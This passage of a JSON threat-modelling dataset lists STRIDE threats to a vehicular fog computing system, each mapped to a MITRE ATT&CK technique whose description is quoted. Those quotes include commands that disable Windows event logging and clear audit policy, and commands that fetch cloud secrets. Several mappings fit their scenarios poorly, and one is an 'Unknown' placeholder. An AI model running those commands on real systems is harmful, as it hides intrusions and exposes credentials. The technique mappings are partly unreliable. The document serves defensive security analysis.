                "administrative access"
            ],
            "mitre_technique": {
                "name": "Exploitation for Privilege Escalation",
                "description": "Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.\n\nWhen initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.\n\nAdversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020) Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) or [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570).",
                "id": "attack-pattern--b21c3b2d-02e6-45b1-980b-e69051040839",
                "technique_id": "T1068"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Compromised smart vehicle gaining elevated privileges to alter data and commands sent to fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "Vehicle security architecture allows privilege escalation due to design flaws.",
                    "Role": "Attacker",
                    "Condition": "Inherent weaknesses in vehicle's security design."
                },
                {
                    "Assumption": "Attacker can manipulate internal systems of the vehicle.",
                    "Role": "Attacker",
                    "Condition": "Physical or remote access to vehicle's internals."
                },
                {
                    "Assumption": "Vehicle interactions with fog nodes do not have stringent verification checks.",
                    "Role": "System Owner",
                    "Condition": "Weak verification protocols between vehicles and fog nodes."
                }
            ],
            "Potential Impact": "Potential for misleading data and commands, jeopardizing the safety of the VFC ecosystem.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "smart vehicle",
                "data manipulation",
                "command alteration"
            ],
            "mitre_technique": {
                "name": "Transmitted Data Manipulation",
                "description": "Adversaries may alter data en route to storage or other systems in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating transmitted data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nManipulation may be possible over a network connection or between system processes where there is an opportunity deploy a tool that will intercept and change information. The type of modification and the impact it will have depends on the target transmission mechanism as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--cc1e737c-236c-4e3b-83ba-32039a626ef8",
                "technique_id": "T1493"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Attacker gains elevated privileges in the cloud environment to manipulate data and analytics outputs.",
            "Assumptions": [
                {
                    "Assumption": "Cloud environment security controls have weaknesses or misconfigurations.",
                    "Role": "Attacker",
                    "Condition": "Exploitable vulnerabilities in cloud security settings."
                },
                {
                    "Assumption": "Attacker has knowledge and tools to exploit these weaknesses.",
                    "Role": "Attacker",
                    "Condition": "Access to cloud and security exploitation tools."
                },
                {
                    "Assumption": "Cloud roles and permissions are not managed with the principle of least privilege.",
                    "Role": "System Owner",
                    "Condition": "Weak access control discipline in cloud management."
                }
            ],
            "Potential Impact": "Manipulated analytics outputs and potential unauthorized access to extensive data stores.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "cloud environment",
                "data manipulation",
                "analytics"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        }
    ]
},
{
    "case_number": "11",
    "batch_number": "22",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "Attackers could spoof fog node identities to impersonate legitimate nodes and intercept data flows between smart vehicles and fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "Attacker has physical or remote access to the fog node network",
                    "Role": "Attacker",
                    "Condition": "Access to fog nodes for spoofing"
                },
                {
                    "Assumption": "The VFC system lacks robust authentication mechanisms",
                    "Role": "System Designers",
                    "Condition": "Weak or no authentication protocols"
                },
                {
                    "Assumption": "Fog node-to-vehicle communication is not encrypted",
                    "Role": "Network Admin",
                    "Condition": "Unencrypted communication channels"
                }
            ],
            "Potential Impact": "This could lead to unauthorized data access and potential manipulation of traffic management instructions.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "fog node",
                "impersonation",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Attackers could spoof vehicle identities to feed false data into the VFC system, leading to incorrect traffic management decisions.",
            "Assumptions": [
                {
                    "Assumption": "Vulnerabilities in vehicle-to-fog node authentication methods",
                    "Role": "Attacker",
                    "Condition": "Weak authentication from vehicles"
                },
                {
                    "Assumption": "Vehicles use default or easily guessable credentials",
                    "Role": "Vehicle Owner",
                    "Condition": "Weak credential management"
                },
                {
                    "Assumption": "The VFC system does not validate the authenticity of data sources adequately",
                    "Role": "System Designers",
                    "Condition": "Lack of comprehensive data source validation"
                }
            ],
            "Potential Impact": "This could result in traffic disruptions and decreased system efficiency.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "smart vehicle",
                "data injection",
                "traffic management"
            ],
            "mitre_technique": {
                "name": "Phishing",
                "description": "Adversaries may send phishing messages to gain access to victim systems. All forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass malware spam campaigns.\n\nAdversaries may send victims emails containing malicious attachments or links, typically to execute malicious code on victim systems. Phishing may also be conducted via third-party services, like social media platforms. Phishing may also involve social engineering techniques, such as posing as a trusted source, as well as evasive techniques such as removing or manipulating emails or metadata/headers from compromised accounts being abused to send messages (e.g., [Email Hiding Rules](https://attack.mitre.org/techniques/T1564/008)).(Citation: Microsoft OAuth Spam 2022)(Citation: Palo Alto Unit 42 VBA Infostealer 2014) Another way to accomplish this is by forging or spoofing(Citation: Proofpoint-spoof) the identity of the sender which can be used to fool both the human recipient as well as automated security tools.(Citation: cyberproof-double-bounce) \n\nVictims may also receive phishing messages that instruct them to call a phone number where they are directed to visit a malicious URL, download malware,(Citation: sygnia Luna Month)(Citation: CISA Remote Monitoring and Management Software) or install adversary-accessible remote management tools onto their computer (i.e., [User Execution](https://attack.mitre.org/techniques/T1204)).(Citation: Unit42 Luna Moth)",
                "id": "attack-pattern--a62a8db3-f23a-4d8f-afd6-9dbc77e7813b",
                "technique_id": "T1566"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Adversaries could spoof cloud service identities to gain access to sensitive data stored in the cloud.",
            "Assumptions": [
                {
                    "Assumption": "Cloud services do not use strong mutual authentication",
                    "Role": "Cloud Service Provider",
                    "Condition": "Missing or weak mutual authentication protocols"
                },
                {
                    "Assumption": "Fog nodes accept data connections without verifying cloud service certificates",
                    "Role": "Fog Node Administrators",
                    "Condition": "Inadequate certificate verification mechanisms"
                },
                {
                    "Assumption": "Sensitive data transmitted over insecure channels",
                    "Role": "Network Admin",
                    "Condition": "Lack of encrypted communication"
                }
            ],
            "Potential Impact": "This could lead to unauthorized access to sensitive vehicular data stored in the cloud.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "cloud service",
                "sensitive data",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Steal Web Session Cookie",
                "description": "An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.\n\nCookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)\n\nThere are several examples of malware targeting cookies from web browsers on the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) Adversaries may also steal cookies by injecting malicious JavaScript content into websites or relying on [User Execution](https://attack.mitre.org/techniques/T1204) by tricking victims into running malicious JavaScript in their browser.(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)\n\nThere are also open source frameworks such as `Evilginx2` and `Muraena` that can gather session cookies through a malicious proxy (e.g., [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)) that can be set up by an adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub Mauraena)\n\nAfter an adversary acquires a valid cookie, they can then perform a [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004) technique to login to the corresponding web application.",
                "id": "attack-pattern--10ffac09-e42d-4f56-ab20-db94c67d76ff",
                "technique_id": "T1539"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Manipulating data packets between fog nodes and cloud services to alter traffic data and analytics results.",
            "Assumptions": [
                {
                    "Assumption": "Weak or no integrity checks on data packets",
                    "Role": "Network Admin",
                    "Condition": "Data lacking integrity verification"
                },
                {
                    "Assumption": "Malware is present within the network",
                    "Role": "Attacker",
                    "Condition": "Malware capable of intercepting and altering data"
                },
                {
                    "Assumption": "Lack of encryption on the data flow between fog nodes and cloud services",
                    "Role": "System Designers",
                    "Condition": "Unencrypted data transmission"
                }
            ],
            "Potential Impact": "This could lead to incorrect decision-making in traffic management and reduced system trustworthiness.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "data packets",
                "fog to cloud",
                "traffic data"
            ],
            "mitre_technique": {
                "name": "Clear Network Connection History and Configurations",
                "description": "Adversaries may clear or remove evidence of malicious network connections in order to clean up traces of their operations. Configuration settings as well as various artifacts that highlight connection history may be created on a system and/or in application logs from behaviors that require network connections, such as [Remote Services](https://attack.mitre.org/techniques/T1021) or [External Remote Services](https://attack.mitre.org/techniques/T1133). Defenders may use these artifacts to monitor or otherwise analyze network connections created by adversaries.\n\nNetwork connection history may be stored in various locations. For example, RDP connection history may be stored in Windows Registry values under (Citation: Microsoft RDP Removal):\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers</code>\n\nWindows may also store information about recent RDP connections in files such as <code>C:\\Users\\\\%username%\\Documents\\Default.rdp</code> and `C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Terminal\nServer Client\\Cache\\`.(Citation: Moran RDPieces) Similarly, macOS and Linux hosts may store information highlighting connection history in system logs (such as those stored in `/Library/Logs` and/or `/var/log/`).(Citation: Apple Culprit Access)(Citation: FreeDesktop Journal)(Citation: Apple Unified Log Analysis Remote Login and Screen Sharing)\n\nMalicious network connections may also require changes to third-party applications or network configuration settings, such as [Disable or Modify System Firewall](https://attack.mitre.org/techniques/T1562/004) or tampering to enable [Proxy](https://attack.mitre.org/techniques/T1090). Adversaries may delete or modify this data to conceal indicators and/or impede defensive analysis.",
                "id": "attack-pattern--3975dbb5-0e1e-4f5b-bae1-cf2ab84b46dc",
                "technique_id": "T1070.007"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Alteration of firmware or software on fog nodes to manipulate traffic flow decisions.",
            "Assumptions": [
                {
                    "Assumption": "Firmware or software updates are not verified",
                    "Role": "System Designers",
                    "Condition": "No integrity checks on updates"
                },
                {
                    "Assumption": "Fog nodes have remote access capabilities without secure channels",
                    "Role": "Network Admin",
                    "Condition": "Unprotected remote management"
                },
                {
                    "Assumption": "Physical security of fog nodes is compromised",
                    "Role": "Attacker",
                    "Condition": "Physical access to or easy reachability of fog nodes"
                }
            ],
            "Potential Impact": "This could lead to unsafe traffic conditions and compromised traffic management effectiveness.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "firmware",
                "software",
                "fog nodes"
            ],
            "mitre_technique": {
                "name": "Component Firmware",
                "description": "Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1019) but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
                "id": "attack-pattern--10d5f3b7-6be6-4da5-9a77-0f1e2bbfcc44",
                "technique_id": "T1109"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Adversaries could alter logs and records stored on fog nodes to cover their tracks after unauthorized activities.",
            "Assumptions": [
                {
                    "Assumption": "Logging mechanisms lack tamper-evident features",
                    "Role": "System Designers",
                    "Condition": "Logs can be altered without detection"
                },
                {
                    "Assumption": "Administrative access to logs is not sufficiently controlled",
                    "Role": "Network Admin",
                    "Condition": "Weak access control on log data"
                },
                {
                    "Assumption": "Intrusion detection systems are not in place",
                    "Role": "Security Admin",
                    "Condition": "Absence of monitoring and alerting mechanisms"
                }
            ],
            "Potential Impact": "This could lead to undetected malicious activities and difficulty in forensic investigations.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "logs",
                "records",
                "fog nodes"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker performs actions that can\u2019t be traced due to lack of logging or insufficient logging on fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "Fog nodes do not generate detailed logs of actions",
                    "Role": "System Designers",
                    "Condition": "Lack of comprehensive logging policies"
                },
                {
                    "Assumption": "Logs are not securely transmitted to a central log server",
                    "Role": "Network Admin",
                    "Condition": "Logs vulnerable to tampering if stored locally"
                },
                {
                    "Assumption": "Logs are not retained for sufficient duration",
                    "Role": "System Designers",
                    "Condition": "Short log retention periods"
                }
            ],
            "Potential Impact": "This makes it difficult to investigate and attribute malicious actions, impacting incident response capabilities.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging",
                "traceability",
                "fog nodes"
            ],
            "mitre_technique": {
                "name": "Disable Windows Event Logging",
                "description": "Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.(Citation: Windows Log Events) This data is used by security tools and analysts to generate detections.\n\nThe EventLog service maintains event logs from various system components and applications.(Citation: EventLog_Core_Technologies) By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to <code>Security Settings\\Local Policies\\Audit Policy</code> for basic audit policy settings or <code>Security Settings\\Advanced Audit Policy Configuration</code> for advanced audit policy settings.(Citation: Audit_Policy_Microsoft)(Citation: Advanced_sec_audit_policy_settings) <code>auditpol.exe</code> may also be used to set audit policies.(Citation: auditpol)\n\nAdversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using the <code>Set-Service -Name EventLog -Status Stopped</code> or <code>sc config eventlog start=disabled</code> commands (followed by manually stopping the service using <code>Stop-Service  -Name EventLog</code>).(Citation: Disable_Win_Event_Logging)(Citation: disable_win_evt_logging) Additionally, the service may be disabled by modifying the \u201cStart\u201d value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog</code> then restarting the system for the change to take effect.(Citation: disable_win_evt_logging)\n\nThere are several ways to disable the EventLog service via registry key modification. First, without Administrator privileges, adversaries may modify the \"Start\" value in the key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Security</code>, then reboot the system to disable the Security EventLog.(Citation: winser19_file_overwrite_bug_twitter) Second, with Administrator privilege, adversaries may modify the same values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-System</code> and <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application</code> to disable the entire EventLog.(Citation: disable_win_evt_logging)\n\nAdditionally, adversaries may use <code>auditpol</code> and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the <code>/success</code> or <code>/failure</code> parameters. For example, <code>auditpol /set /category:\u201dAccount Logon\u201d /success:disable /failure:disable</code> turns off auditing for the Account Logon category.(Citation: auditpol.exe_STRONTIC)(Citation: T1562.002_redcanaryco) To clear the audit policy, adversaries may run the following lines: <code>auditpol /clear /y</code> or <code>auditpol /remove /allusers</code>.(Citation: T1562.002_redcanaryco)\n\nBy disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.",
                "id": "attack-pattern--4eb28bed-d11a-4641-9863-c2ac017d910a",
                "technique_id": "T1562.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Fog node operators deny having sent certain control commands to traffic lights or other infrastructure components.",
            "Assumptions": [
                {
                    "Assumption": "Commands are not digitally signed",
                    "Role": "System Designers",
                    "Condition": "Control commands lack digital signatures"
                },
                {
                    "Assumption": "Communication channels do not possess non-repudiation features",
                    "Role": "Network Admin",
                    "Condition": "Unsecured communication mediums"
                },
                {
                    "Assumption": "Audit trails are not maintained properly",
                    "Role": "System Administrators",
                    "Condition": "Improper maintenance of audit records"
                }
            ],
            "Potential Impact": "This impacts the system\u2019s trustworthiness and can lead to disputes over system control actions.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "control commands",
                "traffic lights",
                "audit trails"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Adversaries deny having accessed or modified sensitive data stored on fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "Access attempts are not logged or monitored",
                    "Role": "System Designers",
                    "Condition": "Lack of logging mechanisms"
                },
                {
                    "Assumption": "Data integrity checks are weak or non-existent",
                    "Role": "Network Admin",
                    "Condition": "Inadequate data verification processes"
                },
                {
                    "Assumption": "Administrative access is not controlled strictly",
                    "Role": "Security Admin",
                    "Condition": "Weak access control policies"
                }
            ],
            "Potential Impact": "This impedes forensic analysis and hampers effective incident response, potentially allowing further compromise.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "sensitive data",
                "fog nodes",
                "access control"
            ],
            "mitre_technique": {
                "name": "Use Alternate Authentication Material",
                "description": "Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls. \n\nAuthentication processes generally require a valid identity (e.g., username) along with one or more authentication factors (e.g., password, pin, physical smart card, token generator, etc.). Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor(s). Alternate authentication material may also be generated during the identity creation process.(Citation: NIST Authentication)(Citation: NIST MFA)\n\nCaching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor(s). Because the alternate authentication must be maintained by the system\u2014either in memory or on disk\u2014it may be at risk of being stolen through [Credential Access](https://attack.mitre.org/tactics/TA0006) techniques. By stealing alternate authentication material, adversaries are able to bypass system access controls and authenticate to systems without knowing the plaintext password or any additional authentication factors.\n",
                "id": "attack-pattern--51a14c76-dd3b-440b-9c20-2bf91d25a814",
                "technique_id": "T1550"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive vehicular data intercepted during transmission between vehicles and fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "Communication channels are not encrypted",
                    "Role": "Network Admin",
                    "Condition": "Unsecured data transmission"
                },
                {
                    "Assumption": "Weak or no authentication used for data transfer",
                    "Role": "System Designers",
                    "Condition": "Lack of authentication protocols"
                },
                {
                    "Assumption": "Ambitious attackers with network access",
                    "Role": "Attacker",
                    "Condition": "Network positioning for interception"
                }
            ],
            "Potential Impact": "This leads to unauthorized access and potential misuse of sensitive data, compromising confidentiality.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "vehicular data",
                "network interception",
                "sensitive data"
            ],
            "mitre_technique": {
                "name": "Network Device Configuration Dump",
                "description": "Adversaries may access network configuration files to collect sensitive data about the device and the network. The network configuration is a file containing parameters that determine the operation of the device. The device typically stores an in-memory copy of the configuration while operating, and a separate configuration on non-volatile storage to load after device reset. Adversaries can inspect the configuration files to reveal information about the target network and its layout, the network device and its software, or identifying legitimate accounts and credentials for later use.\n\nAdversaries can use common management tools and protocols, such as Simple Network Management Protocol (SNMP) and Smart Install (SMI), to access network configuration files.(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks) These tools may be used to query specific data from a configuration repository or configure the device to export the configuration for later analysis. ",
                "id": "attack-pattern--52759bf1-fe12-4052-ace6-c5b0cf7dd7fd",
                "technique_id": "T1602.002"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Unauthorized access to stored data on fog nodes due to inadequate access controls.",
            "Assumptions": [
                {
                    "Assumption": "Data at rest is not encrypted",
                    "Role": "Network Admin",
                    "Condition": "Unencrypted data storage"
                },
                {
                    "Assumption": "Weak role-based access control (RBAC)",
                    "Role": "System Designers",
                    "Condition": "Poorly defined access policies"
                },
                {
                    "Assumption": "Lack of regular security audits",
                    "Role": "Security Admin",
                    "Condition": "Failure to perform audits"
                }
            ],
            "Potential Impact": "This results in unauthorized access and potential exfiltration of sensitive information.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "stored data",
                "access control",
                "sensitive information"
            ],
            "mitre_technique": {
                "name": "Linux and Mac File and Directory Permissions Modification",
                "description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nMost Linux and Linux-based platforms provide a standard set of permission groups (user, group, and other) and a standard set of permissions (read, write, and execute) that are applied to each group. While nuances of each platform\u2019s permissions implementation may vary, most of the platforms provide two primary commands used to manipulate file and directory ACLs: <code>chown</code> (short for change owner), and <code>chmod</code> (short for change mode).\n\nAdversarial may use these commands to make themselves the owner of files and directories or change the mode if current permissions allow it. They could subsequently lock others out of the file. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004) or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).(Citation: 20 macOS Common Tools and Techniques) ",
                "id": "attack-pattern--09b130a2-a77e-4af0-a361-f46f9aad1345",
                "technique_id": "T1222.002"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Information leak from cloud services due to insecure APIs used by fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "APIs do not enforce authentication and authorization checks",
                    "Role": "System Designers",
                    "Condition": "Weak API security"
                },
                {
                    "Assumption": "Fog nodes rely on insecure API endpoints",
                    "Role": "Network Admin",
                    "Condition": "Vulnerable API endpoints"
                },
                {
                    "Assumption": "No rate limiting on API calls",
                    "Role": "System Designers",
                    "Condition": "Unrestricted API access"
                }
            ],
            "Potential Impact": "This could lead to unauthorized access and leakage of sensitive cloud-stored data.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "cloud services",
                "API security",
                "data leakage"
            ],
            "mitre_technique": {
                "name": "Cloud Secrets Management Stores",
                "description": "Adversaries may acquire credentials from cloud-native secret management solutions such as AWS Secrets Manager, GCP Secret Manager, Azure Key Vault, and Terraform Vault.  \n\nSecrets managers support the secure centralized management of passwords, API keys, and other credential material. Where secrets managers are in use, cloud services can dynamically acquire credentials via API requests rather than accessing secrets insecurely stored in plain text files or environment variables.  \n\nIf an adversary is able to gain sufficient privileges in a cloud environment \u2013 for example, by obtaining the credentials of high-privileged [Cloud Accounts](https://attack.mitre.org/techniques/T1078/004) or compromising a service that has permission to retrieve secrets \u2013 they may be able to request secrets from the secrets manager. This can be accomplished via commands such as `get-secret-value` in AWS, `gcloud secrets describe` in GCP, and `az key vault secret show` in Azure.(Citation: Permiso Scattered Spider 2023)(Citation: Sysdig ScarletEel 2.0 2023)(Citation: AWS Secrets Manager)(Citation: Google Cloud Secrets)(Citation: Microsoft Azure Key Vault)\n\n**Note:** this technique is distinct from [Cloud Instance Metadata API](https://attack.mitre.org/techniques/T1552/005) in that the credentials are being directly requested from the cloud secrets manager, rather than through the medium of the instance metadata API.",
                "id": "attack-pattern--cfb525cc-5494-401d-a82b-2539ca46a561",
                "technique_id": "T1555.006"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Flooding fog nodes with excessive data requests to disrupt traffic management services.",
            "Assumptions": [
                {
                    "Assumption": "No rate limiting is implemented",
                    "Role": "Network Admin",
                    "Condition": "Absence of rate limiting mechanisms"
                },
                {
                    "Assumption": "Fog nodes can process requests without constraints",
                    "Role": "System Designers",
                    "Condition": "Insufficient resource constraints"
                },
                {
                    "Assumption": "Lack of intrusion detection systems",
                    "Role": "Security Admin",
                    "Condition": "Missing threat detection systems"
                }
            ],
            "Potential Impact": "This disrupts real-time traffic management and processing capabilities, impacting system availability.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "fog nodes",
                "traffic management",
                "data requests"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 